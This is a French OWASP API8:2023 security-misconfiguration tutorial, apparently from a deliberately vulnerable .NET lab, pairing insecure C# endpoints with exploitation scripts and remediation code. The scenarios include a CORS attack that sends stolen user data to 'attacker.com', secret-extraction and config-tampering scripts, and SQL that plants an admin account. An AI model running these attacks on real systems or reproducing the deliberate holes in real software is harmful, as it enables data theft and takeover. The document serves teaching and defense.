# API8:2023 - Security Misconfiguration

## 📋 Description de la vulnérabilité

La vulnérabilité **Security Misconfiguration** se produit lorsque les configurations de sécurité sont manquantes ou mal implémentées. Cela inclut les configurations par défaut non sécurisées, les endpoints de debug exposés, les headers de sécurité manquants, les messages d'erreur trop détaillés, et les permissions incorrectes.

### Impact potentiel
- Exposition d'informations sensibles sur l'infrastructure
- Accès non autorisé aux fonctionnalités administratives
- Compromission du système via des configurations par défaut
- Fuite d'informations techniques facilitant d'autres attaques
- Manipulation de la configuration de l'application

## 🎯 Endpoints vulnérables

Le contrôleur `Api08SecurityMisconfigController` expose de nombreuses mauvaises configurations :

### 1. **Endpoints de debug**
- `GET /api/config/debug/info` - Informations système complètes
- `GET /api/config/debug/error-test` - Stack traces exposées
- `GET /api/config/metrics` - Métriques système sans authentification

### 2. **Configuration exposée**
- `GET /api/config/settings/all` - Configuration complète incluant les secrets
- `POST /api/config/settings/update` - Modification de configuration à chaud

### 3. **Headers de sécurité**
- `GET /api/config/insecure-response` - Réponse sans headers de sécurité
- `OPTIONS /api/config/cors-test` - CORS mal configuré

### 4. **Logs et traces**
- `GET /api/config/logs/view` - Accès aux logs sans authentification
- `GET /api/config/trace/requests` - Trace des requêtes HTTP

### 5. **Base de données**
- `GET /api/config/database/info` - Informations de connexion exposées
- `POST /api/config/database/query` - Exécution de requêtes SQL arbitraires

### 6. **API Keys et secrets**
- `POST /api/config/apikey/generate` - Génération de clés faibles
- `GET /api/config/apikey/list` - Liste toutes les clés API

### 7. **Méthodes HTTP non sécurisées**
- `TRACE /api/config/trace-enabled` - Méthode TRACE activée
- `OPTIONS /api/config/options-verbose` - OPTIONS révélant trop d'informations

## 🔍 Code vulnérable expliqué

### Exemple 1 : Endpoint de debug exposé

```csharp
[HttpGet("debug/info")]
public IActionResult GetDebugInfo()
{
    // VULNÉRABLE: Expose des informations sensibles sur l'environnement
    return Ok(new
    {
        environment = _env.EnvironmentName,
        applicationName = _env.ApplicationName,
        contentRoot = _env.ContentRootPath,
        webRoot = _env.WebRootPath,
        isDevelopment = _env.IsDevelopment(),
        machineName = Environment.MachineName,
        osVersion = Environment.OSVersion.ToString(),
        processId = Environment.ProcessId,
        is64BitProcess = Environment.Is64BitProcess,
        processorCount = Environment.ProcessorCount,
        userName = Environment.UserName,
        userDomainName = Environment.UserDomainName,
        workingSet = Environment.WorkingSet,
        version = Environment.Version.ToString(),
        systemDirectory = Environment.SystemDirectory,
        currentDirectory = Environment.CurrentDirectory,
        commandLine = Environment.CommandLine,
        // VULNÉRABLE: Variables d'environnement exposées
        environmentVariables = Environment.GetEnvironmentVariables()
    });
}
```

**Problèmes** :
- Expose des chemins système
- Révèle la version du framework
- Montre les variables d'environnement (peuvent contenir des secrets)
- Indique si l'environnement est en développement

### Exemple 2 : Configuration exposée avec secrets

```csharp
[HttpGet("settings/all")]
public IActionResult GetAllSettings()
{
    // VULNÉRABLE: Expose toute la configuration incluant les secrets
    var settings = new Dictionary<string, string>();

    foreach (var kvp in _configuration.AsEnumerable())
    {
        settings[kvp.Key] = kvp.Value ?? "null";
    }

    return Ok(new
    {
        configuration = settings,
        connectionStrings = GetConnectionStrings(),
        providers = (_configuration as IConfigurationRoot)?.Providers.Select(p => p.GetType().Name).ToList()
    });
}

private Dictionary<string, string> GetConnectionStrings()
{
    var connectionStrings = new Dictionary<string, string>();
    var section = _configuration.GetSection("ConnectionStrings");

    foreach (var child in section.GetChildren())
    {
        connectionStrings[child.Key] = child.Value ?? "";
    }

    return connectionStrings;
}
```

### Exemple 3 : Headers de sécurité manquants

```csharp
[HttpGet("insecure-response")]
public IActionResult GetInsecureResponse()
{
    // VULNÉRABLE: Pas de headers de sécurité
    // Manque: X-Content-Type-Options, X-Frame-Options, X-XSS-Protection, etc.

    Response.Headers.Remove("X-Content-Type-Options");
    Response.Headers.Remove("X-Frame-Options");
    Response.Headers.Remove("X-XSS-Protection");
    Response.Headers.Remove("Strict-Transport-Security");
    Response.Headers.Remove("Content-Security-Policy");
    Response.Headers.Remove("Referrer-Policy");

    // VULNÉRABLE: Ajoute des headers qui révèlent des informations
    Response.Headers.Add("Server", "Net8-WebApi-InsecureApp/1.0");
    Response.Headers.Add("X-Powered-By", "ASP.NET Core 8.0");
    Response.Headers.Add("X-AspNet-Version", "8.0.0");
    Response.Headers.Add("X-Debug-Token", Guid.NewGuid().ToString());

    return Ok(new
    {
        message = "Response without security headers",
        timestamp = DateTime.UtcNow
    });
}
```

### Exemple 4 : Exécution SQL arbitraire

```csharp
[HttpPost("database/query")]
public async Task<IActionResult> ExecuteQuery([FromBody] SqlQueryRequest request)
{
    try
    {
        // VULNÉRABLE: Exécution directe de SQL sans validation
        var result = await _context.Database.ExecuteSqlRawAsync(request.Query);

        return Ok(new
        {
            message = "Query executed",
            affectedRows = result,
            query = request.Query // VULNÉRABLE: Echo de la requête
        });
    }
    catch (Exception ex)
    {
        // VULNÉRABLE: Message d'erreur SQL complet
        return BadRequest(new
        {
            error = "Query failed",
            message = ex.Message,
            query = request.Query
        });
    }
}
```

### Exemple 5 : CORS mal configuré

```csharp
// Dans Program.cs (référencé par le contrôleur)
builder.Services.AddCors(options =>
{
    options.AddPolicy("AllowAll", builder =>
    {
        builder
            .AllowAnyOrigin()      // VULNÉRABLE: Accepte toutes les origines
            .AllowAnyMethod()      // VULNÉRABLE: Accepte toutes les méthodes
            .AllowAnyHeader()      // VULNÉRABLE: Accepte tous les headers
            .AllowCredentials();   // TRÈS VULNÉRABLE: Avec AllowAnyOrigin
    });
});
```

## 💥 Scénarios d'exploitation

### Scénario 1 : Récupération de secrets via debug endpoints
```python
import requests

def extract_secrets(base_url):
    """Extrait les secrets depuis les endpoints de debug"""
    
    # Récupérer les variables d'environnement
    response = requests.get(f"{base_url}/api/config/debug/info")
    if response.status_code == 200:
        data = response.json()
        env_vars = data.get("environmentVariables", {})
        
        # Chercher des secrets communs
        secrets = {}
        secret_patterns = [
            "password", "secret", "key", "token", "api", "connection",
            "aws", "azure", "database", "jwt", "oauth"
        ]
        
        for key, value in env_vars.items():
            if any(pattern in key.lower() for pattern in secret_patterns):
                secrets[key] = value
                print(f"Secret trouvé: {key} = {value}")
    
    # Récupérer la configuration complète
    response = requests.get(f"{base_url}/api/config/settings/all")
    if response.status_code == 200:
        config = response.json()
        connection_strings = config.get("connectionStrings", {})
        
        for name, conn_str in connection_strings.items():
            print(f"Connection string: {name} = {conn_str}")
            secrets[f"ConnectionString_{name}"] = conn_str
    
    return secrets
```

### Scénario 2 : Exploitation de CORS mal configuré
```javascript
// Attaque CORS depuis un site malveillant
async function exploitCORS() {
    const targetAPI = 'http://vulnerable-api.com';
    
    // Voler les données de l'utilisateur authentifié
    const response = await fetch(`${targetAPI}/api/users/profile`, {
        credentials: 'include' // Inclut les cookies de session
    });
    
    if (response.ok) {
        const userData = await response.json();
        
        // Exfiltrer les données
        await fetch('http://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(userData)
        });
    }
    
    // Effectuer des actions au nom de l'utilisateur
    await fetch(`${targetAPI}/api/users/delete-account`, {
        method: 'DELETE',
        credentials: 'include'
    });
}
```

### Scénario 3 : Exploitation via méthode TRACE
```bash
# Récupération de headers sensibles via TRACE
curl -X TRACE http://localhost:5000/api/config/trace-enabled \
    -H "Authorization: Bearer secret-token" \
    -H "X-Custom-Secret: my-secret-value"

# La réponse contiendra tous les headers, incluant Authorization
```

### Scénario 4 : Manipulation de configuration
```python
def modify_app_config(base_url):
    """Modifie la configuration de l'application"""
    
    # Mettre l'app en mode debug
    requests.post(f"{base_url}/api/config/settings/update", json={
        "Logging:LogLevel:Default": "Debug",
        "DetailedErrors": "true",
        "Environment": "Development"
    })
    
    # Désactiver la sécurité
    requests.post(f"{base_url}/api/config/settings/update", json={
        "Security:EnableAuthentication": "false",
        "Security:EnableAuthorization": "false",
        "Security:EnableRateLimiting": "false"
    })
    
    print("Configuration modifiée - sécurité désactivée")
```

### Scénario 5 : Accès à la base de données
```python
def database_exploitation(base_url):
    """Exploite l'accès direct à la base de données"""
    
    queries = [
        # Récupérer tous les utilisateurs
        "SELECT * FROM Users",
        
        # Extraire les mots de passe (s'ils ne sont pas hachés)
        "SELECT Email, Password FROM Users WHERE Role = 'Admin'",
        
        # Créer un utilisateur admin
        "INSERT INTO Users (Email, Password, Role) VALUES ('hacker@evil.com', 'password', 'Admin')",
        
        # Modifier les permissions
        "UPDATE Users SET Role = 'Admin' WHERE Email = 'attacker@example.com'"
    ]
    
    for query in queries:
        response = requests.post(f"{base_url}/api/config/database/query", 
            json={"query": query})
        
        print(f"Query: {query}")
        print(f"Result: {response.json()}")
```

## 🛡️ Solutions de remédiation

### 1. **Désactiver les endpoints de debug en production**

```csharp
// Dans Program.cs
if (!app.Environment.IsDevelopment())
{
    // Ne pas mapper les endpoints de debug en production
    app.UseExceptionHandler("/Error");
    app.UseHsts();
}
else
{
    app.UseDeveloperExceptionPage();
    // Endpoints de debug uniquement en développement
    app.MapDebugEndpoints();
}

// Méthode d'extension pour les endpoints de debug
public static class DebugEndpointExtensions
{
    public static void MapDebugEndpoints(this IEndpointRouteBuilder endpoints)
    {
        if (!endpoints.ServiceProvider.GetRequiredService<IWebHostEnvironment>().IsDevelopment())
        {
            return; // Ne rien mapper en production
        }

        endpoints.MapGet("/debug/info", () => new { message = "Debug info only in development" });
    }
}
```

### 2. **Implémenter les headers de sécurité**

```csharp
public class SecurityHeadersMiddleware
{
    private readonly RequestDelegate _next;

    public SecurityHeadersMiddleware(RequestDelegate next)
    {
        _next = next;
    }

    public async Task InvokeAsync(HttpContext context)
    {
        // Ajouter les headers de sécurité
        context.Response.Headers.Add("X-Content-Type-Options", "nosniff");
        context.Response.Headers.Add("X-Frame-Options", "DENY");
        context.Response.Headers.Add("X-XSS-Protection", "1; mode=block");
        context.Response.Headers.Add("Referrer-Policy", "strict-origin-when-cross-origin");
        context.Response.Headers.Add("Permissions-Policy", "geolocation=(), microphone=(), camera=()");
        
        // HSTS pour HTTPS
        if (context.Request.IsHttps)
        {
            context.Response.Headers.Add("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
        }

        // Content Security Policy
        context.Response.Headers.Add("Content-Security-Policy", 
            "default-src 'self'; " +
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " +
            "style-src 'self' 'unsafe-inline'; " +
            "img-src 'self' data: https:; " +
            "font-src 'self'; " +
            "connect-src 'self'; " +
            "frame-ancestors 'none';");

        // Supprimer les headers qui révèlent des informations
        context.Response.Headers.Remove("Server");
        context.Response.Headers.Remove("X-Powered-By");
        context.Response.Headers.Remove("X-AspNet-Version");

        await _next(context);
    }
}

// Dans Program.cs
app.UseMiddleware<SecurityHeadersMiddleware>();
```

### 3. **Configuration CORS sécurisée**

```csharp
// Dans Program.cs
builder.Services.AddCors(options =>
{
    options.AddPolicy("SecurePolicy", policy =>
    {
        policy
            .WithOrigins(
                "https://trusted-domain.com",
                "https://app.trusted-domain.com"
            ) // Origines spécifiques uniquement
            .WithMethods("GET", "POST", "PUT", "DELETE") // Méthodes explicites
            .WithHeaders("Content-Type", "Authorization") // Headers spécifiques
            .SetPreflightMaxAge(TimeSpan.FromHours(24))
            .AllowCredentials(); // Seulement avec des origines spécifiques
    });

    // Politique par défaut restrictive
    options.DefaultPolicyName = "SecurePolicy";
});

// Désactiver CORS pour les endpoints sensibles
[DisableCors]
[ApiController]
[Route("api/admin")]
public class AdminController : ControllerBase
{
    // Endpoints admin sans CORS
}
```

### 4. **Gestion sécurisée des erreurs**

```csharp
public class GlobalExceptionHandler : IExceptionHandler
{
    private readonly ILogger<GlobalExceptionHandler> _logger;
    private readonly IWebHostEnvironment _environment;

    public GlobalExceptionHandler(ILogger<GlobalExceptionHandler> logger, IWebHostEnvironment environment)
    {
        _logger = logger;
        _environment = environment;
    }

    public async ValueTask<bool> TryHandleAsync(
        HttpContext httpContext,
        Exception exception,
        CancellationToken cancellationToken)
    {
        _logger.LogError(exception, "An unhandled exception occurred");

        var response = httpContext.Response;
        response.StatusCode = exception switch
        {
            NotFoundException => StatusCodes.Status404NotFound,
            UnauthorizedException => StatusCodes.Status401Unauthorized,
            ValidationException => StatusCodes.Status400BadRequest,
            _ => StatusCodes.Status500InternalServerError
        };

        var problemDetails = new ProblemDetails
        {
            Status = response.StatusCode,
            Title = GetTitle(response.StatusCode),
            Type = $"https://httpstatuses.com/{response.StatusCode}"
        };

        // Ajouter des détails uniquement en développement
        if (_environment.IsDevelopment())
        {
            problemDetails.Detail = exception.Message;
            problemDetails.Extensions["stackTrace"] = exception.StackTrace;
        }
        else
        {
            problemDetails.Detail = "An error occurred while processing your request.";
            problemDetails.Instance = httpContext.TraceIdentifier;
        }

        await response.WriteAsJsonAsync(problemDetails, cancellationToken);
        return true;
    }

    private static string GetTitle(int statusCode) => statusCode switch
    {
        400 => "Bad Request",
        401 => "Unauthorized",
        404 => "Not Found",
        500 => "Internal Server Error",
        _ => "Error"
    };
}

// Dans Program.cs
builder.Services.AddExceptionHandler<GlobalExceptionHandler>();
builder.Services.AddProblemDetails();
```

### 5. **Protection de la configuration**

```csharp
public interface ISecureConfigurationService
{
    T GetValue<T>(string key);
    bool IsSecretKey(string key);
}

public class SecureConfigurationService : ISecureConfigurationService
{
    private readonly IConfiguration _configuration;
    private readonly HashSet<string> _secretPatterns = new()
    {
        "password", "secret", "key", "token", "connectionstring",
        "apikey", "credential", "certificate"
    };

    public SecureConfigurationService(IConfiguration configuration)
    {
        _configuration = configuration;
    }

    public T GetValue<T>(string key)
    {
        if (IsSecretKey(key))
        {
            throw new UnauthorizedAccessException($"Access to secret '{key}' is not allowed");
        }

        return _configuration.GetValue<T>(key);
    }

    public bool IsSecretKey(string key)
    {
        var lowerKey = key.ToLower();
        return _secretPatterns.Any(pattern => lowerKey.Contains(pattern));
    }
}

// Endpoint sécurisé pour la configuration
[HttpGet("settings/public")]
[Authorize(Roles = "Admin")]
public IActionResult GetPublicSettings([FromServices] ISecureConfigurationService configService)
{
    var publicSettings = new Dictionary<string, object>
    {
        ["Application:Name"] = configService.GetValue<string>("Application:Name"),
        ["Application:Version"] = configService.GetValue<string>("Application:Version"),
        ["Features:EnableNewUI"] = configService.GetValue<bool>("Features:EnableNewUI")
    };

    return Ok(publicSettings);
}
```

### 6. **Désactiver les méthodes HTTP dangereuses**

```csharp
public class DisableHttpMethodsMiddleware
{
    private readonly RequestDelegate _next;
    private readonly HashSet<string> _disabledMethods = new() { "TRACE", "TRACK" };

    public DisableHttpMethodsMiddleware(RequestDelegate next)
    {
        _next = next;
    }

    public async Task InvokeAsync(HttpContext context)
    {
        if (_disabledMethods.Contains(context.Request.Method.ToUpper()))
        {
            context.Response.StatusCode = StatusCodes.Status405MethodNotAllowed;
            await context.Response.WriteAsync("Method not allowed");
            return;
        }

        await _next(context);
    }
}

// Configuration d'OPTIONS sécurisée
[HttpOptions("api/{**path}")]
[AllowAnonymous]
public IActionResult HandleOptions()
{
    Response.Headers.Add("Allow", "GET, POST, PUT, DELETE");
    return Ok();
}
```

## 🔧 Bonnes pratiques

1. **Environnements séparés** : Configurations distinctes pour dev/staging/prod
2. **Principe du moindre privilège** : Accès minimal par défaut
3. **Headers de sécurité** : Implémenter tous les headers recommandés
4. **Gestion d'erreurs** : Ne jamais exposer de détails en production
5. **Chiffrement** : HTTPS obligatoire avec HSTS
6. **Secrets externalisés** : Utiliser Azure Key Vault, AWS Secrets Manager
7. **Validation stricte** : Valider toutes les entrées
8. **Logging sécurisé** : Ne pas logger d'informations sensibles
9. **Updates réguliers** : Maintenir frameworks et dépendances à jour
10. **Audits de sécurité** : Scans réguliers de configuration

## 📊 Tests de détection

### Test de configuration exposée
```bash
# Vérifier les endpoints de debug
curl -X GET http://localhost:5000/api/config/debug/info
curl -X GET http://localhost:5000/api/config/settings/all
curl -X GET http://localhost:5000/api/config/database/info

# Tester les méthodes HTTP
curl -X TRACE http://localhost:5000/api/config/trace-enabled
curl -X OPTIONS http://localhost:5000/api/config/options-verbose -v

# Vérifier les headers de sécurité
curl -I http://localhost:5000/api/config/insecure-response
```

### Script de test automatisé
```python
import requests

def test_security_misconfigurations(base_url):
    tests = {
        "debug_endpoints": [
            "/api/config/debug/info",
            "/api/config/settings/all",
            "/api/config/metrics"
        ],
        "dangerous_methods": {
            "TRACE": "/api/config/trace-enabled",
            "TRACK": "/api/config/track-test"
        },
        "security_headers": [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
    }
    
    results = {}
    
    # Test debug endpoints
    for endpoint in tests["debug_endpoints"]:
        response = requests.get(f"{base_url}{endpoint}")
        if response.status_code == 200:
            results[endpoint] = "❌ EXPOSED"
        else:
            results[endpoint] = "✅ Protected"
    
    # Test dangerous methods
    for method, endpoint in tests["dangerous_methods"].items():
        response = requests.request(method, f"{base_url}{endpoint}")
        if response.status_code != 405:
            results[f"{method} {endpoint}"] = "❌ ENABLED"
        else:
            results[f"{method} {endpoint}"] = "✅ Disabled"
    
    # Test security headers
    response = requests.get(f"{base_url}/api/config/test")
    missing_headers = []
    for header in tests["security_headers"]:
        if header not in response.headers:
            missing_headers.append(header)
    
    if missing_headers:
        results["security_headers"] = f"❌ Missing: {', '.join(missing_headers)}"
    else:
        results["security_headers"] = "✅ All present"
    
    return results
```

## ⚠️ Attention

Ce code est **intentionnellement vulnérable** et ne doit **JAMAIS** être utilisé en production. Il sert uniquement à des fins éducatives pour comprendre et apprendre à détecter les mauvaises configurations de sécurité.

## 📚 Références

- [OWASP API Security Top 10 2023 - Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
- [OWASP Security Headers Project](https://owasp.org/www-project-secure-headers/)
- [CWE-16: Configuration](https://cwe.mitre.org/data/definitions/16.html)
- [Security Headers](https://securityheaders.com/)